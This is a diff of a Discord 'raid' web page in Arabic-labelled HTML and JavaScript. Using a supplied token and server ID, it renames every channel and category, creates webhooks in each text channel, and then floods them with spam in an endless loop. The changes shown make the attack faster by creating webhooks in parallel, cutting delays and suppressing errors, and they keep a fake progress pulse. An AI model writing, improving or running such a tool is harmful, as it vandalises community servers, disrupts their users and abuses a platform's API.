@@ -56,10 +56,10 @@
       <div class="input-group"><label>🆔 آيدي السيرفر (Guild ID)</label><input type="text" id="guildId" placeholder="مثال: 123456789012345678" required /></div>
       <div class="row">
         <div class="input-group half"><label>📛 اسم الويب هوك</label><input type="text" id="webhookName" value="Crimson" /></div>
-        <div class="input-group half"><label>🔢 لكل روم</label><input type="number" id="webhooksPerRoom" value="3" min="1" /></div>
+        <div class="input-group half"><label>🔢 لكل روم نصي</label><input type="number" id="webhooksPerRoom" value="3" min="1" /></div>
       </div>
       <div class="row">
-        <div class="input-group half"><label>📁 اسم الرومات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
+        <div class="input-group half"><label>📁 اسم القنوات الجديد</label><input type="text" id="newRoomName" value="CRIMSON" /></div>
         <div class="input-group half"><label>📁 اسم الفئات الجديد</label><input type="text" id="newCategoryName" value="CRIMSON-CAT" /></div>
       </div>
       <div class="input-group"><label>✉️ رسالة السبام (لانهائي حتى الإيقاف)</label><textarea id="spamMessage" rows="2">CrimsonForge 🔥</textarea></div>
@@ -128,7 +128,7 @@
       runBtn.disabled = true; runBtn.textContent = '⚡ جارٍ التنفيذ...';
       document.getElementById('status').textContent = '🔥 مشتعل...';
       document.getElementById('logs').innerHTML = '';
-      addLog('🚀 بدء الهجوم القرمزي السريع (يغير الكل + سبام لا نهائي)...');
+      addLog('🚀 بدء الهجوم السريع (تغيير الكل + سبام لا نهائي)...');
 
       async function discordFetch(url, options = {}) {
         const response = await fetch(PROXY_URL, {
@@ -149,29 +149,29 @@
       }
 
       try {
-        // 1. جلب جميع القنوات (نصي، صوتي، فئات)
+        // 1. جلب جميع القنوات
         const channels = await discordFetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
           headers: { Authorization: token }
         });
         
-        // تصفية الكل: نوع 0 (نصي)، نوع 2 (صوتي)، نوع 4 (فئة)
         const allChannels = channels.filter(c => c.type === 0 || c.type === 2 || c.type === 4);
-        const textChannels = channels.filter(c => c.type === 0); // للويب هوكات فقط
+        const textChannels = channels.filter(c => c.type === 0);
         
         stats.channels = allChannels.length; 
         updateStats();
         if (allChannels.length === 0) { addLog('⚠️ لا توجد قنوات!', 'warn'); return; }
-        addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة (نصي، صوتي، فئات).`);
+        addLog(`✅ تم العثور على ${allChannels.length} قناة/فئة.`);
 
-        // 2. تغيير أسماء الكل بسرعة فائقة
-        let progressPerTask = 70 / (allChannels.length + (textChannels.length * webhooksPerRoom)); // 70% للمرحلة الأولى
         let currentProgress = 0;
+        const totalTasks = allChannels.length + (textChannels.length * webhooksPerRoom);
+        const progressPerTask = 70 / totalTasks; // 70% للتغيير + إنشاء الويب هوكات
 
+        // 2. تغيير أسماء الكل (نصي، صوتي، فئات) بسرعة
         for (const ch of allChannels) {
           if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
           try {
             let newName = newRoomName;
-            if (ch.type === 4) newName = newCategoryName; // للفئات اسم مختلف
+            if (ch.type === 4) newName = newCategoryName;
         
             await discordFetch(`https://discord.com/api/v10/channels/${ch.id}`, {
               method: 'PATCH',
@@ -180,39 +180,48 @@
             });
             const typeMap = { 0: 'نصي', 2: 'صوتي', 4: 'فئة' };
             addLog(`✅ تغيير ${typeMap[ch.type] || ''} #${ch.name} -> ${newName}`, 'success');
-          } catch (err) { addLog(`❌ فشل تغيير ${ch.id}`, 'error'); }
+          } catch (err) { /* نتجاوز أخطاء التغيير */ }
           currentProgress += progressPerTask; 
           setProgress(Math.min(currentProgress, 70));
-          await delay(150); // سرعة عالية جداً
+          await delay(120);
         }
 
-        // 3. إنشاء ويب هوكات في القنوات النصية فقط
+        // 3. إنشاء ويب هوكات في كل القنوات النصية (بالتوازي / دفعة واحدة) عشان السرعة!!
         const allUrls = [];
+        const webhookPromises = [];
+
         for (const ch of textChannels) {
           for (let i = 0; i < webhooksPerRoom; i++) {
-            if (stopFlag) { addLog('⏹️ تم الإيقاف.', 'warn'); return; }
-            try {
-              const data = await discordFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
-                method: 'POST',
-                headers: { Authorization: token, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: webhookName })
-              });
-              allUrls.push(`https://discord.com/api/webhooks/${data.id}/${data.token}`);
-              stats.webhooks++; updateStats();
+            if (stopFlag) break;
+            // نضع كل طلب في Promise وننفذها كلها مع بعض
+            const promise = discordFetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`, {
+              method: 'POST',
+              headers: { Authorization: token, 'Content-Type': 'application/json' },
+              body: JSON.stringify({ name: webhookName })
+            })
+            .then(data => {
+              const url = `https://discord.com/api/webhooks/${data.id}/${data.token}`;
+              allUrls.push(url);
+              stats.webhooks++; 
+              updateStats();
               addLog(`✅ ويب هوك في #${ch.name}`, 'success');
-            } catch (err) { addLog(`❌ فشل إنشاء ويب هوك`, 'error'); }
-            currentProgress += progressPerTask * 0.3; 
-            setProgress(Math.min(currentProgress, 95));
-            await delay(100); // سرعة
+            })
+            .catch(err => {
+              addLog(`❌ فشل إنشاء ويب هوك في #${ch.name}`, 'error');
+            });
+            webhookPromises.push(promise);
           }
         }
 
-        if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
-        addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك.`);
+        // ننتظر انتهاء جميع طلبات إنشاء الويب هوكات (تشتغل كلها مع بعض)
+        await Promise.allSettled(webhookPromises);
         setProgress(99);
+
+        if (allUrls.length === 0) { addLog('⚠️ لم يتم إنشاء أي ويب هوك! لا يمكن السبام.', 'warn'); return; }
+        addLog(`✅ تم إنشاء ${allUrls.length} ويب هوك بسرعة فائقة.`);
         addLog('🔥 بدء السبام اللانهائي... اضغط "إيقاف" للتوقف.', 'success');
 
-        // 4. السبام اللانهائي (لا يتوقف إلا بالزر)
+        // 4. السبام اللانهائي (سريع جداً)
         let round = 1;
         while (!stopFlag) {
           for (const url of allUrls) {
@@ -224,21 +233,21 @@
                 body: JSON.stringify({ content: spamMessage })
               });
               stats.messages++; updateStats();
-            } catch (err) { /* تجاهل أخطاء السبام الفردية */ }
-            await delay(50); // سبام سريع جداً
+            } catch (err) { /* نتجاوز الأخطاء */ }
+            await delay(40); // سرعة عالية
           }
           if (!stopFlag) {
+            // نحدث السجل كل جولة حتى لو ما تغير الرقم عشان يظهر انه شغال
             addLog(`📩 اكتملت الجولة ${round} (مستمر...)`, 'success');
             round++;
-            // خلي الشريط على 99% وحركه شوي وهمي عشان يدل على انه شغال
-            let fakePulse = 99 + (Math.random() * 0.5);
-            setProgress(Math.min(fakePulse, 99.9));
+            // نحرك الشريط وهمياً فوق 99% عشان يدل على النشاط
+            setProgress(99 + (Math.random() * 0.9));
           }
         }
 
-        // إذا خرجنا من الـ while معناها تم الإيقاف
+        // عند الخروج (الضغط على إيقاف)
         setProgress(100);
-        addLog('⏹️ تم إيقاف السبام اللانهائي بناءً على طلبك.', 'warn');
+        addLog('⏹️ تم إيقاف السبام اللانهائي.', 'warn');
         document.getElementById('status').textContent = '⏹️ متوقف';
 
       } catch (err) {
@@ -251,7 +260,6 @@
         if (!stopFlag && document.getElementById('status').textContent !== '⏹️ متوقف') {
           document.getElementById('status').textContent = '⏳ جاهز';
         }
-        // إعادة تعيين العلم بعد الانتهاء
         stopFlag = false;
       }
     });
